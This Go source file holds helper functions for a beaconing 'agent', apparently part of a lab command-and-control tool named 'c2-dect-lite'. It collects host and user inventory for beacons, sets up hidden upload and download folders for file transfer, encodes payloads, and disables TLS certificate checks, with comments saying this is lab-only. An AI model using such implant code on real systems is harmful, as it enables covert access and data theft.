package main

import (
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"net"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"time"
)

// startTime is the moment the agent was launched.
var startTime = time.Now()

// osHostname returns the host name.
func osHostname() (string, error) { return os.Hostname() }

// osGetpid returns the process id of the agent.
func osGetpid() int { return os.Getpid() }

// goos returns the operating system of the agent.
func goos() string { return runtime.GOOS }

// goarch returns the architecture of the agent.
func goarch() string { return runtime.GOARCH }

// processName returns the name of the running executable.
func processName() string {
	if len(os.Args) > 0 {
		return filepath.Base(os.Args[0])
	}
	return "agent"
}

// currentUsername returns the user the agent runs as.
func currentUsername() string {
	if u, err := user.Current(); err == nil && u.Username != "" {
		return u.Username
	}
	return os.Getenv("USER") + os.Getenv("USERNAME")
}

// primaryIP returns the first global unicast address of the host.
func primaryIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, addr := range addrs {
		ipnet, ok := addr.(*net.IPNet)
		if !ok || ipnet.IP.IsLoopback() {
			continue
		}
		if ipnet.IP.To4() != nil {
			return ipnet.IP.String()
		}
	}
	for _, addr := range addrs {
		ipnet, ok := addr.(*net.IPNet)
		if ok && !ipnet.IP.IsLoopback() {
			return ipnet.IP.String()
		}
	}
	return ""
}

// insecureTLSConfig returns a TLS configuration that accepts self signed
// certificates. It is only used in a lab and never enabled by default.
func insecureTLSConfig() *tls.Config {
	return &tls.Config{InsecureSkipVerify: true} //nolint:gosec // lab only, opt in with -k
}

// buildHello returns the inventory the agent reports on every beacon.
func buildHello(cfg *Config) *hello {
	hostname, _ := osHostname()
	return &hello{
		Hostname:   hostname,
		Username:   currentUsername(),
		InternalIP: primaryIP(),
		OS:         goos(),
		Arch:       goarch(),
		PID:        osGetpid(),
		Process:    processName(),
		SleepSec:   int(cfg.SleepSec),
		Jitter:     int(cfg.Jitter),
		Version:    Version,
		ExpiryUnix: cfg.ExpiryUnix,
		Token:      cfg.Token,
	}
}

// dataDir returns the directory where the agent stores the transferred files.
func dataDir() string {
	base, err := os.UserHomeDir()
	if err != nil {
		base = os.TempDir()
	}
	dir := filepath.Join(base, ".c2-dect-lite", "data")
	_ = os.MkdirAll(filepath.Join(dir, "uploads"), 0700)
	_ = os.MkdirAll(filepath.Join(dir, "downloads"), 0700)
	return dir
}

// writeFile writes a file, creating the parent directories.
func writeFile(path string, data []byte) error {
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		return err
	}
	return os.WriteFile(path, data, 0644)
}

// copyFileImpl copies a file.
func copyFileImpl(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return writeFile(dst, data)
}

// sha256Hex returns the hex encoded SHA-256 digest of a payload.
func sha256Hex(data []byte) string {
	sum := sha256.Sum256(data)
	return hex.EncodeToString(sum[:])
}

// encodeBase64 encodes a payload.
func encodeBase64(data []byte) string { return base64.StdEncoding.EncodeToString(data) }

// decodeBase64 decodes a payload, tolerating the missing padding.
func decodeBase64(raw string) ([]byte, error) {
	if data, err := base64.StdEncoding.DecodeString(raw); err == nil {
		return data, nil
	}
	return base64.RawStdEncoding.DecodeString(raw)
}
